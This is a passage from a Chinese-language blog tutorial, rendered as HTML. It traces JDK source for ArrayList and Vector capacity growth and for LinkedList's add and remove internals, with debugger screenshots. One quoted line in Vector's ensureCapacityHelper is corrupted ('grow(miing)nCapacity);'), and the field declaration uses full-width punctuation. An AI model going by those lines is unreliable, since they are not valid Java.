class="hljs-type">int</span> minCapacity)</span> &#123;<span class="hljs-comment">//确定是否真正扩容</span><br>    modCount++; <span class="hljs-comment">//记录集合被修改的次数（放置多线程操作出现异常）</span><br><br>    <span class="hljs-comment">// overflow-conscious code</span><br>    <span class="hljs-keyword">if</span> (minCapacity - elementData.length &gt; <span class="hljs-number">0</span>)  <span class="hljs-comment">//如果最小需要减去实际大小大于0（例如案例中，minCapacity现在为10，elementData为0）</span><br>        grow(minCapacity); <span class="hljs-comment">//调用grow方法</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">grow</span><span class="hljs-params">(<span class="hljs-type">int</span> minCapacity)</span> &#123;<br>    <span class="hljs-comment">// overflow-conscious code</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">oldCapacity</span> <span class="hljs-operator">=</span> elementData.length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">newCapacity</span> <span class="hljs-operator">=</span> oldCapacity + (oldCapacity &gt;&gt; <span class="hljs-number">1</span>);<span class="hljs-comment">//原先数组大小+原先数组大小/2（也就是1.5倍扩容）</span><br>    <span class="hljs-keyword">if</span> (newCapacity - minCapacity &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//如果新的大小-最小小于0，则扩容直接赋值最小值（例如初始为0时，扩容1.5倍仍为0，就可以赋值最小值10）</span><br>        newCapacity = minCapacity;<br>    <span class="hljs-keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//如果新容量比数组最大值还大</span><br>        newCapacity = hugeCapacity(minCapacity); <span class="hljs-comment">//进行处理（这里暂且不分析）</span><br>    <span class="hljs-comment">// minCapacity is usually close to size, so this is a win:</span><br>    elementData = Arrays.copyOf(elementData, newCapacity);<br>  <span class="hljs-comment">//elementData赋值（如案例，扩容10个空数组）</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所以，第一次扩容newCapacity&#x3D;10，第二次及以后按照1.5倍扩容</p><p>*为什么使用copyOf(): 保留原先数据的基础上，进行扩容</p><p>重新跳回add。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    ensureCapacityInternal(size + <span class="hljs-number">1</span>);  <span class="hljs-comment">// Increments modCount!!</span><br>    elementData[size++] = e;  <span class="hljs-comment">//现在执行这一句</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先把e的值放进elementData（此时大小为1，下标size为0，e的值为1），然后再进行size++。</p><p>接下来继续循环这一流程，判断是否需要扩容，然后再返回（下图为循环i&#x3D;7时）。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230301194358937.png" alt="image-20230301194358937" style="zoom:50%;" /><p>一直到循环到位置不够时，再进行扩容（1.5倍，也就是15）。</p><p>这时候copyOf的作用显现出来，在保证原数据的情况下扩容。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230301200224233.png" alt="image-20230301200224233" style="zoom:50%;" /><p>*ideal做debug时会默认简化数据，若想看到全部数据，取消勾选Enable alternative view for Collections classes和Hide null…..</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230301195431430.png" alt="image-20230301195431430"></p><h4 id="分析使用有参构造器的ArrayList源码"><a href="#分析使用有参构造器的ArrayList源码" class="headerlink" title="分析使用有参构造器的ArrayList源码"></a>分析使用有参构造器的ArrayList源码</h4><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ArrayList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">//①</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<span class="hljs-comment">//②</span><br>    list.add(i);<span class="hljs-comment">//③</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>①</strong>新建ArrayList(8)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Constructs an empty list with the specified initial capacity.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>  initialCapacity  the initial capacity of the list</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the specified initial capacity</span><br><span class="hljs-comment"> *         is negative</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">ArrayList</span><span class="hljs-params">(<span class="hljs-type">int</span> initialCapacity)</span> &#123; <span class="hljs-comment">//初始化容量（案例为8）</span><br>    <span class="hljs-keyword">if</span> (initialCapacity &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">this</span>.elementData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[initialCapacity];<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (initialCapacity == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">this</span>.elementData = EMPTY_ELEMENTDATA;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Illegal Capacity: &quot;</span>+<br>                                           initialCapacity);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>区别在于指定了容量大小。</p><p><strong>②</strong>循环添加数据，到9时进行扩容。（旧容8，需要9）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230301201549141.png" alt="image-20230301201549141"></p><p>进入到grow时，oldCapacity + (oldCapacity &gt;&gt; 1) 也就是8+8&#x2F;2 &#x3D; 12.</p><p>新容减去旧容不小于0，新容也没有超过MAX_ARRAY_SIZE。所以两个if都不会进入。</p><p>扩容为12。</p><p>有参构造器扩容，第一次按照elementData的1.5倍扩容，其余没有太多不同。</p><h2 id="5-Vector"><a href="#5-Vector" class="headerlink" title="5.Vector"></a>5.Vector</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span>&lt;E&gt;<br>    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractList</span>&lt;E&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">List</span>&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable<br></code></pre></td></tr></table></figure><ul><li><p>Vector底层也是一个对象数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object［］ elementData；<br></code></pre></td></tr></table></figure></li><li><p>Vector 是线程同步的，即线程安全，Vector类的操作方法带有synchronized</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//例如get</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> E <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index &gt;= elementCount)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayIndexOutOfBoundsException</span>(index);<br><br>    <span class="hljs-keyword">return</span> elementData(index);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在开发中，需要线程同步安全时，考虑使用Vector</p><ul><li>单线程考虑ArrayList，效率高</li></ul></li></ul><h3 id="Vector和ArrayList比较"><a href="#Vector和ArrayList比较" class="headerlink" title="Vector和ArrayList比较"></a>Vector和ArrayList比较</h3><table><thead><tr><th></th><th>底层结构</th><th>版本</th><th>线程安全（同步）效率</th><th>扩容倍数</th></tr></thead><tbody><tr><td>ArrayList</td><td>可变数组</td><td>jdk1.2</td><td>不安全，效率高</td><td>如果有参,构造1.5倍.<br/>如果是无参<br/>1.第一次10<br/>2.从第二次开始按1.5扩</td></tr><tr><td>Vector</td><td>可变数组</td><td>jdk1.0</td><td>安全，效率不高（因为每次都要做安全校验）</td><td>如果是无参，默认10。满后，就按2倍扩容。<br />如果指定大小，则每次直接按2倍扩。</td></tr></tbody></table><h3 id="底层逻辑和源码分析-1"><a href="#底层逻辑和源码分析-1" class="headerlink" title="底层逻辑和源码分析"></a>底层逻辑和源码分析</h3><p><strong>无参：</strong></p><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vector</span>();<span class="hljs-comment">//①</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<span class="hljs-comment">//②</span><br>    vector.add(i);<span class="hljs-comment">//③</span><br>&#125;<br></code></pre></td></tr></table></figure><p>①创建Vector，初始赋值为10</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Vector</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>(<span class="hljs-number">10</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>②进入循环，先自动装箱。</p><p>③调用add，和ArrayList除了名称不同，其他操作类似</p><p>确定是否需要扩容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    modCount++;<br>    ensureCapacityHelper(elementCount + <span class="hljs-number">1</span>);<br>    elementData[elementCount++] = e;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensureCapacityHelper</span><span class="hljs-params">(<span class="hljs-type">int</span> minCapacity)</span> &#123;<br>    <span class="hljs-comment">// overflow-conscious code</span><br>    <span class="hljs-keyword">if</span> (minCapacity - elementData.length &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//判断是否扩容</span><br>        grow(miing)nCapacity);<br>&#125;<br></code></pre></td></tr></table></figure><p>走到10时，容量不够，进入grow。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">grow</span><span class="hljs-params">(<span class="hljs-type">int</span> minCapacity)</span> &#123;<br>    <span class="hljs-comment">// overflow-conscious code</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">oldCapacity</span> <span class="hljs-operator">=</span> elementData.length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">newCapacity</span> <span class="hljs-operator">=</span> oldCapacity + ((capacityIncrement &gt; <span class="hljs-number">0</span>) ?<br>                                     capacityIncrement : oldCapacity);<br>  <span class="hljs-comment">//判断capacityIncrement是否大于0，此时它为0，所以为false，返回oldCapacity。newCapacity就等于2倍的oldCapacity。</span><br>    <span class="hljs-keyword">if</span> (newCapacity - minCapacity &lt; <span class="hljs-number">0</span>)<br>        newCapacity = minCapacity;<br>    <span class="hljs-keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="hljs-number">0</span>)<br>        newCapacity = hugeCapacity(minCapacity);<br>    elementData = Arrays.copyOf(elementData, newCapacity);<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230301213136992.png" alt="image-20230301213136992" style="zoom:50%;" /><p>如果是<strong>有参构造</strong>，初始化如下，直接赋值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Vector</span><span class="hljs-params">(<span class="hljs-type">int</span> initialCapacity)</span> &#123;<br>    <span class="hljs-built_in">this</span>(initialCapacity, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中的0为capacityIncrement的值。</p><h2 id="6-LinkedList"><a href="#6-LinkedList" class="headerlink" title="6.LinkedList"></a>6.LinkedList</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230302004934704.png" alt="image-20230302004934704" style="zoom:50%;" /><p>特点：</p><ol><li>LinkedList实现了双向链表和双端队列特点</li><li>可以添加任意元素（元素可以重复），包括null</li><li>线程不安全，没有实现同步</li></ol><h3 id="LinkedList的底层操作机制"><a href="#LinkedList的底层操作机制" class="headerlink" title="LinkedList的底层操作机制"></a>LinkedList的底层操作机制</h3><ol><li><p>LinkedList底层维护了一个双向链表． </p></li><li><p>LinkedList中维护了两个属性<strong>first和last</strong>分别指向 <strong>首节点和尾节点</strong></p></li><li><p>每个节点（Node对象），里面又维护了prev、next、item三个属性，其中通过prev指向前一个，通过next指向后一个节点。最终实现双向链表.</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230302005059128.png" alt="image-20230302005059128" style="zoom:50%;" /></li><li><p>所以LinkedList的元素的添加和删除，不是通过数组完成的，相对来说效率较高。</p></li></ol><h4 id="模拟双向链表："><a href="#模拟双向链表：" class="headerlink" title="模拟双向链表："></a><strong>模拟双向链表：</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//模拟一个双向链表</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">jack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;jack&quot;</span>);<br>        <span class="hljs-type">Node</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;tom&quot;</span>);<br>        <span class="hljs-type">Node</span> <span class="hljs-variable">pat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;pat&quot;</span>);<br>        <span class="hljs-comment">//连接三个结点</span><br>        <span class="hljs-comment">//jack -&gt; tom -&gt; pat</span><br>        jack.next = tom;<br>        tom.next = pat;<br>        pat.pre = tom;<br>        tom.pre = jack;<br>        <span class="hljs-comment">//链表头尾</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> jack; <span class="hljs-comment">//jack为头结点</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">last</span> <span class="hljs-operator">=</span> pat; <span class="hljs-comment">//pat为尾结点</span><br><br>        <span class="hljs-comment">//遍历</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">if</span> (first == <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            System.out.println(first);<br>            first = first.next; <span class="hljs-comment">//指向下一个结点</span><br>        &#125;<br>        <span class="hljs-comment">//反向遍历</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">if</span> (last == <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            System.out.println(last);<br>            last = last.pre; <span class="hljs-comment">//指向下一个结点</span><br>        &#125;<br><br>        <span class="hljs-comment">//在tom和pat中添加一个smith</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">smith</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;smith&quot;</span>);<br>        <span class="hljs-comment">//方式，修改结点的next和pre</span><br>        smith.next = pat;<br>        smith.pre = tom;<br>        tom.next = smith;<br>        pat.pre = smith;<br>        <span class="hljs-comment">//遍历输出</span><br>        <span class="hljs-comment">//重置first</span><br>        first = jack; <span class="hljs-comment">//jack为头结点</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">if</span> (first == <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            System.out.println(first);<br>            first = first.next; <span class="hljs-comment">//指向下一个结点</span><br>        &#125;<br>    &#125;<br><span class="hljs-comment">//定义一个Node类。Node对象 表示双向链表的一个结点</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-keyword">public</span> Object item; <span class="hljs-comment">//存放数据</span><br>    <span class="hljs-keyword">public</span> Node next; <span class="hljs-comment">//指向下一个结点</span><br>    <span class="hljs-keyword">public</span> Node pre; <span class="hljs-comment">//指向前一个结点</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = name;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node name=&quot;</span> + item;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="底层结构：增删改查案例"><a href="#底层结构：增删改查案例" class="headerlink" title="底层结构：增删改查案例"></a>底层结构：增删改查案例</h4><h5 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">LinkedList</span> <span class="hljs-variable">linkedList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>(); <span class="hljs-comment">//①</span><br>linkedList.add(<span class="hljs-number">1</span>); <span class="hljs-comment">//②</span><br>linkedList.add(<span class="hljs-number">2</span>); <span class="hljs-comment">//③</span><br></code></pre></td></tr></table></figure><p>① 新建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Constructs an empty list.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">LinkedList</span><span class="hljs-params">()</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230302011839673.png" alt="image-20230302011839673" style="zoom:50%;" /><p>②调用add，先进行装箱</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Integer <span class="hljs-title function_">valueOf</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)<br>        <span class="hljs-keyword">return</span> IntegerCache.cache[i + (-IntegerCache.low)];<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后执行add。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    linkLast(e); <span class="hljs-comment">//调用linkLast()</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">linkLast</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">final</span> Node&lt;E&gt; l = last; <span class="hljs-comment">//last此时为空</span><br>    <span class="hljs-keyword">final</span> Node&lt;E&gt; newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;&gt;(l, e, <span class="hljs-literal">null</span>);  <span class="hljs-comment">//newNode指向新节点（null，e，null），具体如下图。</span><br>    last = newNode; <span class="hljs-comment">//last指向新节点</span><br>    <span class="hljs-keyword">if</span> (l == <span class="hljs-literal">null</span>)<br>        first = newNode; <span class="hljs-comment">//first 指向新节点</span><br>    <span class="hljs-keyword">else</span><br>        l.next = newNode; <br>    size++; <span class="hljs-comment">//size+1</span><br>    modCount++;<br>&#125;<br></code></pre></td></tr></table></figure><p>关于新建Node，操作如下。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230302012505885.png" alt="image-20230302012505885"></p><p>一轮后结果如下。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/20230302012813.png" style="zoom:50%;" /><p>③ 第二次add操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">linkLast</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">final</span> Node&lt;E&gt; l = last; <span class="hljs-comment">//l指向last，此刻是1节点</span><br>    <span class="hljs-keyword">final</span> Node&lt;E&gt; newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;&gt;(l, e, <span class="hljs-literal">null</span>);  <span class="hljs-comment">//newNode指向新节点（1节点，e，null），具体如下图。</span><br>    last = newNode; <span class="hljs-comment">//last指向新节点</span><br>    <span class="hljs-keyword">if</span> (l == <span class="hljs-literal">null</span>)<br>        first = newNode; <br>    <span class="hljs-keyword">else</span><br>        l.next = newNode; <span class="hljs-comment">//1节点的下一节点指向新节点</span><br>    size++; <span class="hljs-comment">//size+1</span><br>    modCount++;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">linkedList.remove(); <span class="hljs-comment">//默认删除第一个</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> E <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> removeFirst();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> E <span class="hljs-title function_">removeFirst</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">final</span> Node&lt;E&gt; f = first; <br>    <span class="hljs-keyword">if</span> (f == <span class="hljs-literal">null</span>) <span class="hljs-comment">//如果first为空，抛出异常</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchElementException</span>();<br>    <span class="hljs-keyword">return</span> unlinkFirst(f); <span class="hljs-comment">//调用unlinkFirst</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> E <span class="hljs-title function_">unlinkFirst</span><span class="hljs-params">(Node&lt;E&gt; f)</span> &#123;<br>    <span class="hljs-comment">// assert f == first &amp;&amp; f != null;</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">E</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> f.item; <br>    <span class="hljs-keyword">final</span> Node&lt;E&gt; next = f.next; <span class="hljs-comment">//next 指向first的next</span><br>    f.item = <span class="hljs-literal">null</span>;<br>    f.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC  //first的next置空</span><br>    first = next;  <span class="hljs-comment">//first指向next</span><br>    <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">null</span>)  <br>        last = <span 